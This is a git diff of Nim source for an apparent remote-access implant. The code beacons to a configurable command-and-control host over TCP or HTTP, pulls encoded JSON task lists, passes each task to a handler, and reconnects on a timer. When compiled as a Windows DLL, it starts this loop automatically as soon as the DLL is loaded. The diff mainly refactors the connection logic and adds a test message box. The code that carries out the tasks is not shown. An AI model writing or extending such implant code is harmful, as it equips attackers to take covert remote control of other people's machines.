@@ -15,15 +15,18 @@ const port {.intdefine.}: int = 1234
 const autoConnectTime {.intdefine.}: int = 5000
 const ip {.strdefine.}: string = "127.0.0.1"
 
+let app: App = App()
+
+app.ip = ip
+app.port = port
+app.autoConnectTime = autoConnectTime
+
 when defined(tcp):
-  let app: App = App()
   app.socket = newSocket()
 elif defined(http):
   let app: App = App()
   app.httpRoot = "http://" & ip & ":" & $port
   app.httpClient = newHttpClient()
-else:
-  let app: App = App()
 
 var sleepTime = 5
 
@@ -75,58 +78,14 @@ proc handleTask(app: App, jsonNode: JsonNode) =
 proc receiveCommands(app: App) =
   app.connectToC2()
   while true:
-    when defined(debug):
-      echo "fetching commands"
-    when defined(tcp):
-      app.socket.send("tasksplz\r\n")
-      let line = app.socket.recvLine()
-      if line.len == 0:
-        app.socket.close()
-        break
-    
-      let decoded = decode(line)
-      let jsonNode = parseJson(decoded)
-      if jsonNode.kind == JArray:
-        for task in jsonNode:
-          handleTask app, task 
-    elif defined(http):
-      var httpResponse: string
-      var fail = false
-      try:
-        when defined(debug):
-          echo "fetching " & app.httpRoot & "/t?id=" & app.token
-        httpResponse = app.httpClient.getContent(app.httpRoot & "/t?id=" & app.token)
-      except OSError:
-        when defined(debug):
-          echo getCurrentExceptionMsg()
-        app.httpClient = newHttpClient()
-        fail = true
-      except HttpRequestError:
-        app.connectToC2()
-        fail = true
-      if not fail:
-        let tasks = parseJson(decode(httpResponse))
-        if tasks.kind == JArray:
-          for task in tasks:
-            handleTask app, task
+    let tasks = app.fetchTasks()
+    if tasks.kind == JArray:
+      for task in tasks:
+        handleTask app, task
     sleep sleepTime*1000
 
 proc beginConnection() =
-  when defined(tcp):
-    while true:
-      try:
-        app.socket.connect(ip, Port(port))
-        receiveCommands(app)
-      except OSError:
-        sleep(autoConnectTime)
-        continue
-      when defined(tcp):
-        app.socket = newSocket()
-      sleep(autoConnectTime)
-  elif defined(http):
-    when defined(debug):
-      echo "receiving commands"
-    receiveCommands(app)
+  app.receiveCommands()
 
 when defined(library) and defined(windows):
   proc NimMain() {.cdecl, importc.}
@@ -135,6 +94,7 @@ when defined(library) and defined(windows):
     NimMain()
     
     if fdwReason == DLL_PROCESS_ATTACH: 
+      MessageBox(0, "Hello, world !", "Nim is Powerful", 0)
       beginConnection()
 
     return true
